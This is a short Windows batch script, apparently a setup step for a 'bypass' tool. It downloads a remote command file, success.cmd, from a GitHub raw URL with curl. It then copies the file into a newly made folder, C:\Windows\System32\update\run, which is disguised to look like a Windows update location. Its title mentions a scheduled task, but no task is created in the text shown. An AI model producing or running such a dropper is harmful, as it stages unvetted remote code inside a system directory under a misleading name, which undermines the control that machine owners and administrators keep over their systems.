@echo off
title Setting up the Scheduled task
cd "C:\Program Files"
mkdir MCBypass
cd MCBypass
echo Downloading automated bat file
curl -O https://raw.githubusercontent.com/rhuda21/mcbypass/main/success.cmd
mkdir "C:\Windows\System32\update\run"
cd C:\Windows\System32\update\run
copy  "C:\Program Files\MCBypass\success.cmd" "C:\Windows\System32\update\run"
exit